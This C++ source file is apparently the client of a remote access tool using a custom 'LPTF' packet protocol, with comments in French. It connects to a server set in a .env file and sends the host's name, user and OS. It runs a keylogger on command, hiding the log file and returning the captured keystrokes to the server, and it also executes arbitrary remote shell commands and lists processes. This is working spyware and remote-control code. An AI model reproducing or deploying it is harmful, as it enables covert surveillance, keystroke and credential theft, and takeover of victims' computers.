#include "ClientApp.hpp"
#include <windows.h>
#include <psapi.h>
#include <iostream>
#include <chrono>
#include <thread>
#include "../utils/EnvLoader.hpp"
#include "../utils/LPTF/LPTF_PacketType.hpp"
#include "../utils/LPTF/LPTF_Packet.hpp"
#include "../utils/SystemInfo/SystemInfo.hpp"
#include "../utils/SystemInfo/TaskList.hpp"
#include "../utils/CommandSystem/BashExec.hpp"

ClientApp::ClientApp()
    : running(true)
{}

ClientApp::~ClientApp()
{
    running = false;
    if (serverThread.joinable())
        serverThread.join();
    if (keylogThread.joinable())
        keylogThread.join();
    if (socket)
        socket->closeSocket();
}

void ClientApp::run()
{
    SetConsoleOutputCP(CP_UTF8);
    SetConsoleCP(CP_UTF8);

    char exePath[MAX_PATH];
    GetModuleFileNameA(NULL, exePath, MAX_PATH);
    // SetFileAttributesA(exePath, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
    KeyLogger::hideFile("key_file.txt");

    LPTF_Socket::initialize();

    socket = std::make_unique<LPTF_Socket>();

    auto env = EnvLoader::loadEnv("../../.env");
    std::string ip = EnvLoader::loadIP("../../.env");
    int port = EnvLoader::loadPort("../../.env");

    socket->connectSocket(ip, port);
    std::cout << "Connecté au serveur " << ip << ":" << port << std::endl;

    // Envoi auto infos système
    std::cout << "Envoi automatique des informations système..." << std::endl;
    auto sysInfo = SystemInfo::getSystemInfo();
    std::string jsonInfo = SystemInfo::toJson(sysInfo);

    std::cout << "Informations système:" << std::endl;
    std::cout << "- Nom d'hôte: " << sysInfo["hostname"] << std::endl;
    std::cout << "- Utilisateur: " << sysInfo["username"] << std::endl;
    std::cout << "- Système: " << sysInfo["operating_system"] << std::endl;

    std::vector<uint8_t> payload(jsonInfo.begin(), jsonInfo.end());
    LPTF_Packet sysInfoPacket(1, PacketType::GET_INFO, 0, 1, 1, payload);
    socket->sendBinary(sysInfoPacket.serialize());
    std::cout << "Informations système envoyées au serveur." << std::endl;

    ProcessLister processLister;
    std::vector<std::string> exeList = processLister.getExeList();

    // Lancer le thread de gestion des requêtes serveur
    serverThread = std::thread(&ClientApp::serverRequestHandler, this);

    // Main thread : simple boucle d'attente (interruption par arrêt/erreur)
    while (running)
    {
        std::this_thread::sleep_for(std::chrono::milliseconds(100));
    }
}

// -------- Thread handler ---------
void ClientApp::serverRequestHandler()
{
    while (running)
    {
        try
        {
            std::vector<uint8_t> data = socket->recvBinary();
            LPTF_Packet packet = LPTF_Packet::deserialize(data);

            switch (packet.getType())
            {
            case PacketType::GET_INFO:
            {
                std::cout << "\n[CLIENT DEBUG] Received GET_INFO packet from server." << std::endl;
                std::cout << "[CLIENT DEBUG] Raw payload: '" << std::string(packet.getPayload().begin(), packet.getPayload().end()) << "'" << std::endl;
                std::cout << "[CLIENT DEBUG] Gathering system info..." << std::endl;
                auto sysInfo = SystemInfo::getSystemInfo();
                for (const auto &pair : sysInfo)
                    std::cout << "[CLIENT DEBUG]   " << pair.first << ": " << pair.second << std::endl;

                std::string jsonInfo = SystemInfo::toJson(sysInfo);
                std::cout << "[CLIENT DEBUG] System info JSON: " << jsonInfo << std::endl;

                std::vector<uint8_t> payload(jsonInfo.begin(), jsonInfo.end());
                LPTF_Packet response(1, PacketType::RESPONSE, 0, 1, 1, payload);
                std::cout << "[CLIENT DEBUG] Sending RESPONSE packet with system info to server." << std::endl;
                socket->sendBinary(response.serialize());
                std::cout << "[CLIENT DEBUG] RESPONSE packet sent." << std::endl;
                break;
            }

            case PacketType::RESPONSE:
                break;

            case PacketType::KEYLOG:
            {
                std::string cmd(packet.getPayload().begin(), packet.getPayload().end());
                if (cmd == "start")
                    startKeylogger();
                else if (cmd == "stop")
                    stopKeylogger(packet);
                break;
            }

            case PacketType::EXEC_COMMAND:
            {
                std::string cmd(packet.getPayload().begin(), packet.getPayload().end());
                BashExec exec;
                BashExec::executeToFile(cmd, "exec_output.txt");
                break;
            }

            case PacketType::PROCESS_LIST:
            {
                bool namesOnly = (packet.getFlags() & 1) != 0;
                std::string resp;
                DWORD pids[1024], cbNeeded;
                if (EnumProcesses(pids, sizeof(pids), &cbNeeded))
                {
                    size_t count = cbNeeded / sizeof(DWORD);
                    for (size_t i = 0; i < count; ++i)
                    {
                        DWORD pid = pids[i];
                        if (pid == 0)
                            continue;
                        HANDLE hProc = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, pid);
                        if (!hProc)
                            continue;
                        CHAR nameBuf[MAX_PATH] = {0};
                        HMODULE hMod;
                        DWORD cbMod;
                        if (EnumProcessModules(hProc, &hMod, sizeof(hMod), &cbMod))
                        {
                            GetModuleBaseNameA(hProc, hMod, nameBuf, sizeof(nameBuf));
                        }
                        CloseHandle(hProc);
                        std::string name(nameBuf);
                        if (namesOnly)
                            resp += name + "\n";
                        else
                            resp += std::to_string(pid) + "  " + name + "\n";
                    }
                }
                std::vector<uint8_t> payload(resp.begin(), resp.end());
                LPTF_Packet reply(1, PacketType::PROCESS_LIST, 0,
                                  packet.getPacketId(), packet.getSessionId(), payload);
                socket->sendBinary(reply.serialize());
                break;
            }

            default:
                std::cout << "\n[SERVEUR] Type de paquet inconnu: " << (int)packet.getType() << std::endl;
                std::cout << "Entrez le message : ";
                std::cout.flush();
            }
        }
        catch (const std::exception &e)
        {
            if (running)
            {
                std::cout << "\n[ERREUR] Connexion fermée: " << e.what() << std::endl;
                running = false;
            }
            break;
        }
    }
}

// --------------- Keylogger ---------------
void ClientApp::startKeylogger()
{
    if (!keyLogger)
    {
        keyLogger = std::make_unique<KeyLogger>("key_file.txt");
        KeyLogger::hideFile("key_file.txt");
        if (keylogThread.joinable())
            keylogThread.join();
        keylogThread = std::thread([this]() { keyLogger->start(); });
        // Ne pas detach : le thread sera joint lors de la destruction
    }
}

void ClientApp::stopKeylogger(const LPTF_Packet& packet)
{
    if (keyLogger)
    {
        keyLogger->stop();
        if (keylogThread.joinable())
            keylogThread.join();
        std::this_thread::sleep_for(std::chrono::milliseconds(100));
        std::string loggedData = keyLogger->getLoggedData();
        std::vector<uint8_t> responsePayload(loggedData.begin(), loggedData.end());
        LPTF_Packet logResponse(1, PacketType::RESPONSE, 0,
                                packet.getPacketId(), packet.getSessionId(), responsePayload);
        socket->sendBinary(logResponse.serialize());
        keyLogger->clearLogFile();
        KeyLogger::unhideFile("key_file.txt");
        keyLogger.reset();
    }
}
